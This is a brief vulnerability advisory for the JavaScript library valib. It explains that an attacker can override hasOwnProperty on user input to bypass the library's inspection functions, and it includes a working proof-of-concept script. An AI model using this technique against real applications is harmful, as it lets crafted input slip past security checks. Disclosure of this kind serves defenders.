# Overview

`valib` is a A standalone javascript library tailored for validation, this package is vulnerable to Internal Property Tampering.

A maliciously crafted JavaScript object can bypass several inspection functions provided by valib. Valib uses a built-in function `hasOwnProperty` from the unsafe user-input to examine an object. It is possible for a crafted payload to overwrite this function to manipulate the inspection results to bypass security checks.

# Proof of Concept

```
"use strict";
var valib = require('valib');
var json = {
    key1: null,
    key2: {
        url: "http://example.com"
    },
    key3: "17850",
    key4: "OK",
    key5: "2012-10-06T04:13:00 00:00",
    key6: [1, 2, 3],
    key7: "Yes"
};
json.hasOwnProperty = function(val) {return false;}
function test(userJson){
    console.log(valib.Object.isEmpty(userJson));
    console.log(valib.Object.countKeys(userJson));
    console.log(valib.Object.hasValue(userJson, "Yes"));
}
test(json);
```
